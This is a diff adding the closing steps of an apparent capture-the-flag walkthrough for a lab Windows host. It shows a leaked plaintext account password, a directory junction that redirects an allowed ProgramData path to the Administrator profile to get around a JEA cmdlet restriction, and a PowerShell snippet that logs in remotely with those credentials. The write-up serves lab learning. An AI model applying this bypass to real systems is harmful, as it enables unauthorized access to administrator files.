@@ -102,3 +102,16 @@ The following command helps us to look for files that end with `.log` extension:
 The search shows us a file that contains credentials for a new account: <span style="color:red">jea_test_account:Ab!Q@vcg^%@#1</span>
 
 We spent some time reading about JEA (Just Enough Administration), which is a security technology that enables delegated administration for anything managed by PowerShell. Reading the configuration files (C:\Users\k.svensson\Documents\jea_test_account.psrc and C:\Users\k.svensson\Documents\jea_test_account.pssc), we discover that jea_test_account is the only user who can execute a commandlet named `Check-File` which gets the content of a file only if it is inside `D:/` or `C:/ProgramData`
+
+The final step is the create a Junction which is a soft link for folders in Windows (like symbilic links in Linux).
+
+<span style="color:blue"><emb>New-Item -ItemType Junction -Path 'C:\ProgramData\hecsv' -Target 'C:\Users\Administrator'</emb></span>
+
+All what we have to do is to login as jea_test_account and read the root.txt through check-file cmdlet.
+
+To connect to jea we do the following:
+
+<span style="color:blue">$user = "jea_test_account" 
+$pass = ConvertTo-SecureString "Ab!Q@vcg^%@#1" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList  ($user, $pass)
+Enter-PSSession -Computer 10.10.10.210 -credential $cred -ConfigurationName jea_test_account -verbose -debug -Authentication Negotiate</emb></span>
